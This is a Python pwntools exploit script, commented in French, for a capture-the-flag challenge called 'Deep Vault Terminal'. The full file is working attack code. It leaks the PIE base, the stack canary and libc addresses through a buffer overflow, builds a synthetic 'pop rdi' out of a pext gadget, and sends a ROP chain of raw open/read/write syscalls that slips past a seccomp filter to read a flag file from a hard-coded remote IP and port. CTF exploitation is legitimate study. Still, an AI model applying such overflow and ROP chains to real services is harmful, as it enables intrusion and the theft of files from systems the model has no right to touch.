#!/usr/bin/env python3
# PWN#002 - battleCTF - "Deep Vault Terminal"
# =============================================================================
# Full RELRO | NX | Canary | PIE | stripped | libc Debian glibc 2.42.
#
# SECCOMP : filtre BPF 5 instructions -> tue UNIQUEMENT execve(59)/execveat(322).
#           open/read/write sont AUTORISES => pas de shell, mais ORW possible.
# Le binaire desobfusque (XOR 0x5a) le chemin du flag en .bss : "/flag/flag.txt".
# Au demarrage il imprime "Vault seal: %lx" = adresse code -> FUITE PIE gratuite.
#
# Menu (machine a etats) a chaque tour :
#   read(name, 73) -> puts(buf) [fuite]  ->  read(message, 256) [overflow]
#   buf @ rbp-0x50 ; canari @ off 72 ; saved_rbp @ 80 ; RIP @ 88 ; main() boucle.
#
# Probleme : le binaire n'a PAS de pop rdi/rsi/rdx -> il faut la libc pour les
# gadgets de syscall. Mais pour LEAKER la libc on n'a pas encore de pop rdi...
# ASTUCE : gadget `pext rdi, rax, rcx ; ret` (0x1529). Avec rcx = 0xffff...ffff
# (masque plein), pext copie rax dans rdi => "pop rdi" synthetique a partir de
# pop rax (0x11e0) + pop rcx (0x1210) + pext. 100% gadgets du binaire (PIE connu).
#
# Round 1 : overflow -> ROP  rdi=&GOT[read] ; puts@plt ; retour boucle main
#           -> fuite l'adresse libc de read -> base libc.
# Round 2 : overflow -> ROP ORW en SYSCALLS BRUTS (immunise movaps) :
#           open("/flag/flag.txt",0) ; read(3,scratch,0x100) ; write(1,scratch,0x100)
#
# Usage :  ./exp.py            (remote)       ./exp.py --local  (test local)
# =============================================================================
from pwn import *
from pwnlib.exception import PwnlibException
import argparse, re

elf  = ELF("./vault_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf
context.log_level = "info"

ap = argparse.ArgumentParser()
ap.add_argument("--local", action="store_true")
ap.add_argument("--host", default="169.58.126.107")
ap.add_argument("--port", type=int, default=5001)
ap.add_argument("--status", action="store_true",
                help="diagnostic : ORW /proc/self/status (existe a coup sur) au lieu du flag")
args = ap.parse_args()

# --- offsets PIE (binaire) ---
SEAL_OFF = 0x13a6          # "Vault seal" imprime pie+0x13a6
POP_RAX  = 0x11e0          # pop rax ; ret
POP_RCX  = 0x1210          # pop rcx ; ret
PEXT_RDI = 0x1529          # pext rdi, rax, rcx ; ret   (rcx=~0 -> rdi=rax)
RET      = 0x1016          # ret (alignement)
PUTS_PLT = 0x1030
GOT_READ = 0x3fb0          # GOT[read]
LOOP     = 0x148a          # call 1676 ; jmp 148a  (relance un tour)
PATH       = 0x2038 if args.status else 0x4070  # 0x2038="/proc/self/status", 0x4070="/flag/flag.txt"
SCRATCH_LIBC = 0x1e8be0    # tampon ORW dans la .bss de la libc (toujours mappee RW)

# --- offsets libc 2.42 (captures AVANT rebase) ---
OFF_READ = libc.sym["read"]
G = dict(rdi=0x2a9b7, rsi=0x29e29, rdx=0x96372, rax=0x44386, sc=0x926e2)

PAD = b"A" * 72

def new():
    io = process("./vault_patched") if args.local else remote(args.host, args.port)
    io.timeout = 10          # si le serveur bride/traine : on echoue vite et on relance
    return io

def solve():
    io = new()
    # --- fuite PIE ---
    io.recvuntil(b"Vault seal: ")
    pie = int(io.recvline(), 16) - SEAL_OFF
    if pie & 0xfff:
        io.close(); return None
    log.info(f"PIE  = {hex(pie)}")

    # --- fuite canari + saved_rbp (puts du name, 73 octets) ---
    io.recvuntil(b"Enter your name: ")
    io.send(PAD + b"\x41")                 # 73e octet ecrase le \x00 du canari
    io.recvuntil(b"Hello, " + PAD)
    after = io.recvline()
    if len(after) < 14 or after[0] != 0x41:
        io.close(); return None
    canary    = u64(b"\x00" + after[1:8])
    saved_rbp = u64(after[8:14].ljust(8, b"\x00"))
    if (saved_rbp >> 40) != 0x7f:
        io.close(); return None
    log.info(f"canary = {hex(canary)}  rbp = {hex(saved_rbp)}")

    # --- Round 1 : fuite libc via rdi synthetique + puts@plt(GOT[read]) ---
    rop1 = flat(
        pie + POP_RAX, pie + GOT_READ,         # rax = &GOT[read]
        pie + POP_RCX, 0xffffffffffffffff,     # rcx = masque plein
        pie + PEXT_RDI,                        # rdi = pext(rax, rcx) = &GOT[read]
        pie + RET,                             # alignement 16
        pie + PUTS_PLT,                        # puts(&GOT[read]) -> fuite
        pie + LOOP,                            # retour a la boucle -> round 2
    )
    io.recvuntil(b"Leave a message for the vault keeper: ")
    io.send(PAD + p64(canary) + p64(saved_rbp) + rop1)
    io.recvuntil(b"Message received.\n")
    leak = io.recvline().rstrip(b"\n")
    read_addr = u64(leak.ljust(8, b"\x00"))
    libc.address = read_addr - OFF_READ
    log.info(f"read@libc = {hex(read_addr)}  -> libc = {hex(libc.address)}")
    if libc.address & 0xfff:
        io.close(); return None

    def g(k):
        return libc.address + G[k]

    SC = g("sc")

    # Un tour de menu = un overflow. On envoie une ROP courte par tour (robuste a
    # la fragmentation TCP : un read() serveur peut rendre < 256 o), et on revient
    # a la boucle main a chaque fois (LOOP) -> le process reste vivant, le fd reste
    # ouvert entre les tours.
    def round_rop(rop):
        io.recvuntil(b"Enter your name: ")
        io.send(b"A" * 8)                              # nom bidon
        io.recvuntil(b"Leave a message for the vault keeper: ")
        io.send(PAD + p64(canary) + p64(saved_rbp) + rop + p64(pie + LOOP))

    scratch = libc.address + SCRATCH_LIBC
    # --- Round 2 : open PUIS read, dans le MEME tour ---
    # Le fd rendu par open() (dans rax) est INCONNU en remote (socat ouvre des fds
    # en plus -> open renvoie 4+, pas 3). On recupere donc rax -> rdi avec le gadget
    # binaire `pext rdi, rax, rcx` (rcx=~0 => rdi=rax=fd), puis on lit avec ce fd.
    round_rop(flat(
        g("rdi"), pie + PATH, g("rsi"), 0,       g("rax"), 2, SC,    # open(path, 0) -> rax=fd
        pie + POP_RCX, 0xffffffffffffffff, pie + PEXT_RDI,           # rdi = fd (copie de rax)
        g("rsi"), scratch,    g("rdx"), 0x100,   g("rax"), 0, SC,    # read(fd, scratch, 256)
    ))
    # --- Round 3 : write(1, scratch, 256) (fd 1 = stdout, connu) ---
    round_rop(flat(g("rdi"), 1, g("rsi"), scratch, g("rdx"), 0x100, g("rax"), 1, SC))

    data = io.recvrepeat(2)
    io.close()
    return data

def main():
    for _ in range(20):
        try:
            data = solve()
        except (EOFError, PwnlibException):
            data = None
        if not data:
            continue
        if args.status:                       # diagnostic : on veut voir le dump brut
            log.info("dump ORW (%d octets) :" % len(data))
            print(data.decode(errors="replace"))
            if b"Name:" in data or b"Pid:" in data:
                log.success("ORW fonctionne en remote (contenu de /proc/self/status lu)")
                return
            continue
        flags = re.findall(rb"[A-Za-z0-9_]{2,}\{[^}]{3,}\}", data)
        if flags:
            log.success("FLAG : " + flags[0].decode(errors="replace"))
            return
        log.info("sortie sans flag, nouvel essai...\n" + data[:200].hex())
    log.failure("echec")

if __name__ == "__main__":
    main()
